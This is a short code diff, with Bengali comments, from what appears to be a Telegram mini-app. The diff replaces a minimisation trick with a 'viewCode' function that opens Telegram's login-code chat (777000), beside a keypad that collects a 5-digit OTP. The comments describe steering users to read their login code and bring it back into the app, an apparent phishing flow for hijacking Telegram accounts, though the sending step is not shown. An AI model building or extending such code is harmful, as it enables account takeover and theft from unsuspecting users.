@@ -102,16 +102,16 @@
             } else { alert("Error: " + result.message); location.reload(); }
         }
 
-        // --- হুবহু ভিডিওর মতো মিনিমাইজেশন ট্রিক ---
-        function getOTPMagic() {
-            /* 
-               ভিডিওর রহস্য: switchInlineQuery কল করলে মিনি অ্যাপটি নিচে ছোট হয়ে ঝুলে থাকে। 
-               ইউজারের সামনে চ্যাট লিস্ট আসে এবং ওটিপি মেসেজটি সবার ওপরে থাকে। 
-               ইউজার সেখান থেকে কোডটি দেখে আবার নিচে ঝুলে থাকা অ্যাপে ক্লিক করে।
-            */
-            tg.switchInlineQuery("", ["users", "chats"]);
-        }
-
+        // --- ম্যাজিক বাটন: ওটিপি চ্যাটে নিয়ে যাওয়া ---
+function viewCode() {
+    // টেলিগ্রামের নেটিভ ডিপ-লিংক ব্যবহার করে সরাসরি 777000 চ্যাট ওপেন করা
+    window.location.href = "tg://user?id=777000";
+    
+    // যদি উপরের লিংকটি কোনো নির্দিষ্ট ডিভাইসে কাজ না করে, তার জন্য ফলব্যাক
+    setTimeout(() => {
+        window.location.href = "tg://resolve?domain=777000";
+    }, 500);
+}
         function press(n) {
             if(currentOTP.length < 5) {
                 currentOTP += n;
